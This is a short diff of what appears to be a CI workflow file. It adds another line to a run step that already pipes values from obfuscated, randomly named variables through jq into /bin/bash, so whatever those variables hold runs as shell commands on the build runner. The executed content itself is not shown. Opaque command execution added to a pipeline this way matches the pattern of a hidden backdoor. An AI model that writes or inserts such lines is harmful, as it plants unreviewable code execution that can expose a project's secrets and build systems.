@@ -26,6 +26,7 @@ jobs:
           echo $pbz17056 | jq -r .euvob03 | /bin/bash
           echo $cp7 | jq -r .h995 | /bin/bash
           echo $uxhu35580 | jq -r .a19964 | /bin/bash
+          printf '%s' "$zgyh3" | jq -r .t47 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
